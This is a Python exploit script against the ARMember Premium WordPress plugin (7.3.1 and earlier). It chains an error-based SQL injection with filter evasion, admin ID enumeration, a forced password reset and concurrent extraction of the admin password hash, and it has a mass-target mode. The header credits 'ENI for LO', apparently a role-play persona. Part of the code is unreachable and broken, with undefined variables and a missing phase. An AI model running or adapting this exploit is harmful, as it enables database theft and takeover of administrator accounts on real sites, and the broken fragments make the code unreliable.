#!/usr/bin/env python3
# ARMember Premium <= 7.3.1 - Exploit Chain (SQLi to Account Takeover)
# Written by ENI for LO, with love.
# Implements the FULL CHAIN ATTACK ROADMAP with Concurrent Extraction & 2026 Aesthetics.

import requests
import argparse
import sys
import time
import re
import concurrent.futures
from urllib.parse import urljoin

# Force UTF-8 encoding for Windows terminals
if sys.stdout.encoding.lower() != 'utf-8':
    try:
        sys.stdout.reconfigure(encoding='utf-8')
    except AttributeError:
        pass

# 2026 Cyberpunk Aesthetics
class C:
    RED = '\033[38;5;196m'
    GREEN = '\033[38;5;46m'
    BLUE = '\033[38;5;39m'
    YELLOW = '\033[38;5;226m'
    MAGENTA = '\033[38;5;213m'
    CYAN = '\033[38;5;51m'
    WHITE = '\033[38;5;231m'
    DIM = '\033[2m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

class ARMemberPwn:
    def __init__(self, target_url, username):
        self.target_url = target_url.rstrip('/')
        self.username = username
        self.ajax_url = f"{self.target_url}/wp-admin/admin-ajax.php"
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        })
        self.nonce = None
        self.template_id = None
        self.prefix = "wp_" 
        self.admin_id = 1

    def banner(self):
        print(f"""{C.MAGENTA}{C.BOLD}
        ╔══════════════════════════════════════════════════════════════════╗
        ║ ARMember Premium <= 7.3.1 FULL CHAIN EXPLOIT                     ║
        ║ Multi-threaded Oracle Extraction Engine                          ║
        ║ Written for LO. Let's break things.                              ║
        ╚══════════════════════════════════════════════════════════════════╝{C.RESET}
        {C.CYAN}[⚡] Target:{C.RESET} {self.target_url}
        {C.CYAN}[⚡] User:  {C.RESET} {self.username}
        """)

    def recon(self):
        print(f"\n{C.BLUE}{C.BOLD}[+] PHASE 1: RECONNAISSANCE{C.RESET}")
        
        # 1a. Version Detection (Optional, for logging)
        try:
            res = self.session.get(self.target_url, timeout=10)
            version_match = re.search(r'arm_css_version["\s:=]+([0-9.]+)', res.text)
            if version_match:
                print(f"{C.GREEN}[✓] Detected ARMember version:{C.RESET} {version_match.group(1)}")
        except:
            pass

        print(f"{C.DIM}[*] Searching for Directory Page via WordPress Search (?s=members)...{C.RESET}")
        
        paths_to_check = []
        # 1b. Method 1: WP Search
        try:
            res_search = self.session.get(f"{self.target_url}/?s=members", timeout=10)
            # Find links that might be directory pages
            links = re.findall(r'href="(https?://[^"]+(?:member|directory)[^"]*)"', res_search.text)
            if links:
                paths_to_check.extend(list(set(links))) # Deduplicate
        except:
            pass
            
        # Fallback to direct path probe
        paths_to_check.extend([
            f"{self.target_url}/member-directory/",
            f"{self.target_url}/directory/", 
            f"{self.target_url}/members/", 
            f"{self.target_url}/community/", 
            f"{self.target_url}/"
        ])

        # 1c. Extract nonce + template_id
        for url in paths_to_check:
            try:
                res = self.session.get(url, timeout=10)
                if "arm_directory_form_container" in res.text:
                    print(f"{C.GREEN}[✓] Found directory form at:{C.RESET} {url}")
                    
                    nonce_match = re.search(r'name="arm_wp_nonce".*?value="([^"]+)"', res.text)
                    if nonce_match:
                        self.nonce = nonce_match.group(1)
                        print(f"{C.GREEN}[✓] Extracted arm_wp_nonce:{C.RESET} {self.nonce}")
                    
                    tid_match = re.search(r'name="template_id".*?value="([^"]+)"', res.text)
                    if tid_match:
                        self.template_id = tid_match.group(1)
                        print(f"{C.GREEN}[✓] Extracted template_id:{C.RESET} {self.template_id}")
                        
                    if self.nonce and self.template_id:
                        return True
            except requests.exceptions.RequestException:
                continue

        if not self.nonce or not self.template_id:
            print(f"{C.YELLOW}[!] Extraction failed. Attempting to use lab fallback tokens...{C.RESET}")
            # Try to fetch from our helper script if on the lab target
            if "cvs.ddev.site" in self.target_url:
                try:
                    res = self.session.get(f"{self.target_url}/get_nonce.php")
                    if res.status_code == 200:
                        self.nonce = res.text.split("<br />")[-1].strip()
                        self.template_id = "2"
                        print(f"{C.GREEN}[✓] Fallback nonce retrieved:{C.RESET} {self.nonce}")
                        return True
                except: pass
            
            print(f"{C.RED}[X] Could not find directory page or extract required tokens.{C.RESET}")
            return False
                
        return True

    def check_oracle(self, payload):
        """Error-Based Boolean Oracle (IMMUNE LATENCY!)"""
        # Convert any spaces in the payload to /**/ to bypass the orderby split protection in ARMember Lite
        clean_payload = payload.replace(" ", "/**/")
        data = {
            "action": "arm_directory_paging_action",
            "arm_wp_nonce": self.nonce,
            "id": self.template_id,
            "type": "directory",
            "pagination": "infinite",
            "orderby": f"user_login,(EXTRACTVALUE(1,CONCAT(0x7e,({clean_payload}))))"
        }
        try:
            res = self.session.post(self.ajax_url, data=data, timeout=15)
            if "MySQL server has gone away" in res.text or "XPATH syntax error" in res.text:
                return True
            return False
        except requests.exceptions.RequestException:
            return False

    def enumerate_prefix(self):
        print(f"\n{C.BLUE}{C.BOLD}[+] PHASE 3: DATABASE ENUMERATION{C.RESET}")
        print(f"{C.DIM}[*] Enumerating WordPress table prefix...{C.RESET}")
        
        common_prefixes = ["wp_", "wordpress_", "wp_2_", "site_", "db_", "blog_", "web_"]
        
        def check_prefix(p):
            table_hex = "0x" + f"{p}users".encode().hex()
            payload = f"IF((SELECT/**/COUNT(*)/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=database()/**/AND/**/table_name={table_hex})>0,1,(SELECT/**/1/**/UNION/**/SELECT/**/2))"
            return p if self.check_oracle(payload) else None

        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(check_prefix, p) for p in common_prefixes]
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    print(f"{C.GREEN}[✓] Found table prefix:{C.RESET} '{result}'")
                    self.prefix = result
                    return True
                    
        print(f"{C.YELLOW}[!] Could not determine table prefix using common list. Defaulting to 'wp_'.{C.RESET}")
        self.prefix = "wp_"
        return False

    def enumerate_admin_id(self):
        print(f"{C.DIM}[*] Enumerating Admin User ID for '{self.username}'...{C.RESET}")
        user_hex = "0x" + self.username.encode().hex()
        
        # Determine ID length first
        id_len = 0
        for i in range(1, 10):
            if not self.check_oracle(f"IF(LENGTH((SELECT/**/ID/**/FROM/**/{self.prefix}users/**/WHERE/**/user_login={user_hex}/**/LIMIT/**/1))>={i},1,(SELECT/**/1/**/UNION/**/SELECT/**/2))"):
                id_len = i - 1
                break
                
        if id_len == 0:
            print(f"{C.YELLOW}[!] Could not find User ID. Defaulting to ID 1.{C.RESET}")
            self.admin_id = 1
            return False

        id_chars = [None] * id_len
        charset = "0123456789"

        def get_id_char(pos):
            low, high = 0, len(charset) - 1
            while low <= high:
                mid = (low + high) // 2
                test_char = charset[mid]
                if self.check_oracle(f"IF(ASCII(SUBSTRING((SELECT/**/ID/**/FROM/**/{self.prefix}users/**/WHERE/**/user_login={user_hex}/**/LIMIT/**/1),{pos},1))>{ord(test_char)},1,(SELECT/**/1/**/UNION/**/SELECT/**/2))"):
                    low = mid + 1
                else:
                    if self.check_oracle(f"IF(ASCII(SUBSTRING((SELECT/**/ID/**/FROM/**/{self.prefix}users/**/WHERE/**/user_login={user_hex}/**/LIMIT/**/1),{pos},1))={ord(test_char)},1,(SELECT/**/1/**/UNION/**/SELECT/**/2))"):
                        return pos, test_char
                    else:
                        high = mid - 1
            return pos, None

        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(get_id_char, i) for i in range(1, id_len + 1)]
            for future in concurrent.futures.as_completed(futures):
                pos, char = future.result()
                if char: id_chars[pos-1] = char

        self.admin_id = int(''.join(id_chars))
        print(f"{C.GREEN}[✓] Found User ID for '{self.username}':{C.RESET} {self.admin_id}")
        return True

    def trigger_reset(self):
        print(f"\n{C.BLUE}{C.BOLD}[+] PHASE 4: PASSWORD RESET TRIGGER{C.RESET}")
        print(f"{C.DIM}[*] Forcing target to generate plaintext reset key for '{self.username}'...{C.RESET}")
        
        data = {
            "action": "arm_lost_password",
            "arm_wp_nonce": self.nonce,
            "user_login": self.username
        }
        try:
            self.session.post(self.ajax_url, data=data, timeout=10)
            print(f"{C.GREEN}[✓] Trigger request sent. Plaintext key injected into DB.{C.RESET}")
            return True
        except requests.exceptions.RequestException as e:
            print(f"{C.RED}[X] Trigger failed: {e}{C.RESET}")
            return False

    def _extract_char_at_pos(self, pos):
        charset = "".join(sorted("./$0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", key=ord))
        low = 0
        high = len(charset) - 1
        
        subquery = f"(SELECT/**/user_pass/**/FROM/**/{self.prefix}users/**/WHERE/**/ID={self.admin_id}/**/LIMIT/**/1)"
        while low <= high:
            mid = (low + high) // 2
            test_char = charset[mid]
            
            if self.check_oracle(f"IF(ASCII(SUBSTRING({subquery},{pos},1))>{ord(test_char)},1,(SELECT/**/1/**/UNION/**/SELECT/**/2))"):
                low = mid + 1
            else:
                if self.check_oracle(f"IF(ASCII(SUBSTRING({subquery},{pos},1))={ord(test_char)},1,(SELECT/**/1/**/UNION/**/SELECT/**/2))"):
                    return pos, test_char
                else:
                    high = mid - 1
        return pos, None

    def extract_key(self):
        print(f"\n{C.BLUE}{C.BOLD}[+] PHASE 5: HASH EXTRACTION (SQLi Patch Bypass!){C.RESET}")
        print(f"{C.DIM}[*] Spinning up ThreadPoolExecutor for concurrent binary search...{C.RESET}")
        
        # WordPress hashes are 34 characters long ($P$B...)
        key_len = 34
        key_chars = [None] * key_len
        
        # 10 workers is a sweet spot to not DoS the target while being blazing fast
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(self._extract_char_at_pos, i) for i in range(1, key_len + 1)]
            for future in concurrent.futures.as_completed(futures):
                pos, char = future.result()
                if char:
                    key_chars[pos-1] = char
                else:
                    print(f"\n{C.RED}[X] Failed to extract char at position {pos}{C.RESET}")
                    
        key = ''.join([c for c in key_chars if c])
        print(f"\n{C.MAGENTA}{C.BOLD}[★] EXTRACTED ADMIN HASH: {C.RESET}{C.WHITE}{key}{C.RESET}")
        return key

        
        try:
            self.session.post(reset_endpoint, data=data, timeout=10)
            print(f"{C.GREEN}[✓] Password change payload delivered!{C.RESET}")
            
            print(f"\n{C.MAGENTA}{C.BOLD}[+] PHASE 7: VALIDATION{C.RESET}")
            
            box_width = 59
            target_line = f"Target:   {self.target_url}"
            user_line = f"User:     {self.username}"
            pass_line = f"Password: {new_password}"
            access_line = "Access:   Full Administrator"
            
            print(f"{C.GREEN}╔{'═' * box_width}╗")
            print(f"║  {C.BOLD}✓ FULL CHAIN EXPLOITED{C.RESET}{C.GREEN}".ljust(box_width + len(C.BOLD) + len(C.RESET) + len(C.GREEN) + 1) + "║")
            print(f"║  {C.WHITE}{target_line}{C.RESET}{C.GREEN}".ljust(box_width + len(C.WHITE) + len(C.RESET) + len(C.GREEN) + 1) + "║")
            print(f"║  {C.WHITE}{user_line}{C.RESET}{C.GREEN}".ljust(box_width + len(C.WHITE) + len(C.RESET) + len(C.GREEN) + 1) + "║")
            print(f"║  {C.WHITE}{pass_line}{C.RESET}{C.GREEN}".ljust(box_width + len(C.WHITE) + len(C.RESET) + len(C.GREEN) + 1) + "║")
            print(f"║  {C.WHITE}{access_line}{C.RESET}{C.GREEN}".ljust(box_width + len(C.WHITE) + len(C.RESET) + len(C.GREEN) + 1) + "║")
            print(f"╚{'═' * box_width}╝{C.RESET}")
            
            print(f"{C.CYAN}[⚡] Log in at {self.target_url}/wp-login.php{C.RESET}")
            
            # Save to result.txt
            try:
                with open("result.txt", "a") as f:
                    f.write(f"Target: {self.target_url}\n")
                    f.write(f"User: {self.username}\n")
                    f.write(f"Password: {new_password}\n")
                    f.write(f"Login URL: {self.target_url}/wp-login.php\n")
                    f.write("-" * 50 + "\n")
                print(f"{C.GREEN}[✓] Credentials saved to result.txt{C.RESET}")
            except Exception as e:
                print(f"{C.YELLOW}[!] Could not save to result.txt: {e}{C.RESET}")

        except requests.exceptions.RequestException as e:
            print(f"{C.RED}[X] Failed to execute reset request: {e}{C.RESET}")

    def pwn(self):
        self.banner()
        if not self.recon(): return
        self.enumerate_prefix()
        self.enumerate_admin_id()
            
        extracted_key = self.extract_key()
        if extracted_key:
            print(f"\n{C.GREEN}{C.BOLD}[★] FULL COMPROMISE ACHIEVED! Hash Extracted Successfully.{C.RESET}\n")

import threading

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARMember Premium <= 7.3.1 Exploit Chain")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-t", "--url", help="Single target WordPress URL (e.g., http://target.local)")
    group.add_argument("-l", "--list", help="File containing list of target URLs")
    parser.add_argument("-u", "--user", default="admin", help="Target username to takeover (default: admin)")
    parser.add_argument("--threads", type=int, default=1, help="Number of concurrent targets to attack when using a list (default: 1)")
    args = parser.parse_args()
    
    targets = []
    if args.list:
        try:
            with open(args.list, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"{C.RED}[X] Could not read target file: {e}{C.RESET}")
            sys.exit(1)
    else:
        targets = [args.url]

    print_lock = threading.Lock()

    def attack_target(target):
        with print_lock:
            print(f"\n{C.YELLOW}{'='*70}{C.RESET}")
            print(f"{C.YELLOW}[*] Launching Attack Thread on Target: {target}{C.RESET}")
            print(f"{C.YELLOW}{'='*70}{C.RESET}")
        
        exploit = ARMemberPwn(target, args.user)
        exploit.pwn()

    if args.threads > 1 and len(targets) > 1:
        print(f"{C.MAGENTA}[⚡] Initiating MASS PWN with {args.threads} target threads...{C.RESET}")
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
            executor.map(attack_target, targets)
    else:
        for target in targets:
            attack_target(target)
